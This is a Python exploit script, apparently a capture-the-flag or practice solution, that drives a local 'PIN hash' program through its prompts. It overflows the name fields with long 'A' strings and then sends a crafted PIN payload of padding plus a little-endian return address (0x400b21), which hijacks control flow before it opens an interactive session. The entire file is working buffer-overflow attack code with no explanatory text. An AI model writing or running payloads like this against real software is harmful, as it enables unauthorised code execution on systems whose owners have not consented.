import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
p.readuntil('Enter the size of the PIN you wish to use: ')
p.sendline('1')
p.readuntil('Enter your first name: ')
p.sendline('A' * 70)
p.readuntil('Continue generating hashes? [y/n] ')
p.sendline('y')
p.readuntil('Enter your first name: ')
p.sendline('test')
p.readuntil('Enter your last name: ')
p.sendline('A' * 70)
p.readuntil('Continue generating hashes? [y/n] ')
p.sendline('y')
p.readuntil('Enter your first name: ')
p.sendline('test')
p.readuntil('Enter your last name: ')
p.sendline('test')
p.readuntil('Apply PIN Scrambling?')
p.sendline('y')
p.readuntil('Enter the PIN you wish to use:')
#\x21\x0b\x40
p.sendline(b'A' * 48 + b'B' * 5 + b'\x00' * 3 + b'\x21\x0b\x40\x00' + b'\x00' * 5 )
# 400b21
p.interactive()
